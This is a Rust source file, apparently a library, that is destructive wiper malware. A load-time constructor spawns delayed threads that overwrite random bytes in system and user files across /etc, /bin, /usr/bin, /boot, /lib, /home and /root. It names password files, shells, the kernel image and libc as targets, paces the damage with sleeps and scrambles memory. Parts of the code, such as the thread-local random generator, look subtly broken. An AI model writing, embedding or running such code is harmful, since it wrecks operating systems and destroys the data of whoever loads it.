use std::fs::{self, OpenOptions};
use std::io::{Seek, SeekFrom, Write};
use std::os::unix::fs::OpenOptionsExt;
use std::path::{Path, PathBuf};
use std::thread;
use std::collections::HashSet;
use std::time::Duration;

fn randbyte() -> u8 {
    thread_local! {
        static mut X: u64 = 0xA33F103BABEF0101;
    }
    unsafe {
        X.with(|xx| {
            *xx ^= *xx << 13;
            *xx ^= *xx >> 7;
            *xx ^= *xx << 17;
            (*xx >> 3 | 0x44) as u8
        })
    }
}

fn walk_paths(root: &str, ex: &[&str], lim: usize) -> Vec<PathBuf> {
    let mut v = Vec::new();
    let mut seen = HashSet::new();
    let mut stack = vec![PathBuf::from(root)];
    while let Some(p) = stack.pop() {
        if v.len() > lim { break; }
        if let Ok(meta) = fs::metadata(&p) {
            if meta.is_dir() {
                if let Ok(rd) = fs::read_dir(&p) {
                    for entry in rd.flatten() {
                        let pb = entry.path();
                        if seen.contains(&pb) { continue; }
                        stack.push(pb.clone());
                        seen.insert(pb);
                    }
                }
            } else {
                if ex.iter().any(|&f| p.display().to_string().contains(f)) { continue; }
                v.push(p);
            }
        }
    }
    v
}

fn corrupt_file(fp: &Path, strong: bool) {
    let mut f = match OpenOptions::new().read(true).write(true)
        .custom_flags(libc::O_CLOEXEC | libc::O_SYNC)
        .open(fp) {
        Ok(x) => x,
        Err(_) => return,
    };
    let sz = match f.metadata() { Ok(m) => m.len(), Err(_) => 0 };
    if sz == 0 { return; }
    let cs = if sz > 5_000_000 { 13 + (randbyte() as usize % 30) } else { 7 + randbyte() as usize % 17 };
    let mut offsetz = randbyte() as u64 % (sz / 3 + 1);
    for n in 0..cs {
        let where_ = if strong {
            ((randbyte() as u64) << 8) % sz
        } else {
            offsetz + ((n as u64) * 19) % sz
        };
        if f.seek(SeekFrom::Start(where_)).is_ok() {
            let mut buf = [0u8; 37];
            let cnt = 1 + (randbyte() as usize % buf.len());
            for i in 0..cnt {
                buf[i] = randbyte();
            }
            let _ = f.write_all(&buf[..cnt]);
        }
    }
}

fn routers() -> Vec<(&'static str, &'static [&'static str])> {
    vec![
        ("/etc", &["shadow", "passwd", "sudo", "ssh"]),
        ("/usr/bin", &["bash", "zsh", "env", "python", "sudo", "init"]),
        ("/bin", &["bash", "zsh", "dash", "sh", "su"]),
        ("/boot", &["vmlinuz", "initrd"]),
        ("/sbin", &["reboot", "halt"]),
        ("/lib", &["ld", "libc"]),
        ("/", &["init", "vmlinuz"]),
        ("/mnt", &[]),
        ("/root", &[]),
        ("/var", &[]),
        ("/tmp", &[]),
        ("/home", &[]),
    ]
}

fn hard_targets() -> Vec<PathBuf> {
    let mut a = Vec::new();
    for &(dir, special) in routers().iter().rev() {
        let mut v = walk_paths(dir, &[], if dir == "/" { 160 } else { 45 });
        for sp in special.iter() {
            let x = PathBuf::from(dir).join(sp);
            if x.exists() { v.push(x); }
        }
        a.extend(v);
    }
    a
}

#[inline(never)]
fn corrupt_mem(lim: usize) {
    let mut b = Vec::with_capacity(lim + 17);
    for _ in 0..lim {
        b.push(randbyte());
    }
    for i in 0..(lim/7) {
        let idx = ((randbyte() as usize * i * 13) % b.len()).min(b.len().saturating_sub(1));
        b[idx] ^= randbyte();
        if i % 11 == 0 {
            use rand::seq::SliceRandom;
            b.shuffle(&mut rand::thread_rng());
        }
    }
    unsafe {
        let ptr = b.as_mut_ptr();
        std::ptr::write_bytes(ptr, randbyte(), b.len() / 9);
    }
    drop(b);
}

fn slow_corruptor() {
    let mut files = hard_targets();
    let mut seen = HashSet::new();
    let mut pass = 0usize;
    while pass < 12 {
        let islast = pass > 7;
        if islast {
            use rand::seq::SliceRandom;
            files.shuffle(&mut rand::thread_rng());
        }
        let batch = files.iter().enumerate()
            .filter(|(i, _)| (*i + pass) % 3 == 0)
            .map(|(_, p)| p)
            .collect::<Vec<_>>();
        for fp in batch {
            if !seen.insert(fp.to_owned()) { continue; }
            let strong = pass >= 6 || fp.display().to_string().contains("init");
            corrupt_file(fp, strong);
            thread::sleep(Duration::from_millis(178 + randbyte() as u64 % 640));
        }
        corrupt_mem(0x2FFF + (randbyte() as usize * 14) % 19191);
        if pass % 2 == 0 {
            thread::sleep(Duration::from_secs(1));
        }
        pass += 1;
    }
}

#[no_mangle]
#[inline(never)]
pub extern "C" fn _xram_killall_userland_kernel() {
    thread::spawn(|| { slow_corruptor(); }).join().ok();
}

#[ctor::ctor]
fn __start_krx__() {
    thread::spawn(|| {
        thread::sleep(Duration::from_secs(3 + randbyte() as u64 % 7));
        for _ in 0..2 + (randbyte() % 2) {
            thread::spawn(_xram_killall_userland_kernel);
        }
    });
}

